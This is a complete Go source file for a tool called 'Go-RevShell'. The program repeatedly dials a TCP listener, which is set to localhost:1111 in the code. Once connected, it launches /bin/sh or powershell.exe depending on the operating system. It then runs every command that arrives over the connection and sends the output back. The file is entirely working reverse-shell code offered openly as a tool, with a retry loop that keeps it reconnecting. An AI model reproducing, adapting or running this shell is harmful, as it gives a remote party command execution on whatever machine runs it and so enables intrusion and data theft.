package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

const banner string = `
  ____                   ____                   ____    _              _   _
 / ___|   ___           |  _ \    ___  __   __ / ___|  | |__     ___  | | | |
| |  _   / _ \   _____  | |_) |  / _ \ \ \ / / \___ \  | '_ \   / _ \ | | | |
| |_| | | (_) | |_____| |  _ <  |  __/  \ V /   ___) | | | | | |  __/ | | | |
 \____|  \___/          |_| \_\  \___|   \_/   |____/  |_| |_|  \___| |_| |_|

`

func main() {
	connectToClient("localhost", 1111)
}

func connectToClient(host string, port int) {
	for {
		connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
		if err != nil {
			time.Sleep(2 * time.Second)
		} else {
			connexion.Write([]byte(banner + "[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
			var shell string
			switch runtime.GOOS {
			case "windows":
				shell = "powershell.exe"
			default:
				shell = "/bin/sh"
			}
			reverseShell(connexion, shell)
			connexion.Close()
		}
	}
}

func reverseShell(connexion net.Conn, shell string) {
	for {
		connexion.Write([]byte("[Go-RevShell@" + connexion.LocalAddr().String() + "] > "))
		clientEntry, err := bufio.NewReader(connexion).ReadString('\n')
		handleError(err)
		clientEntry = strings.TrimSuffix(clientEntry, "\n")
		if clientEntry == "quit" {
			break
		}
		cmdOutput, err := exec.Command(shell, "-c", clientEntry).Output()
		if err != nil {
			connexion.Write([]byte("[-] Unknown command.\n"))
		} else {
			connexion.Write(append([]byte("[+] Command sent.\n"), cmdOutput...))
		}
	}
}

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
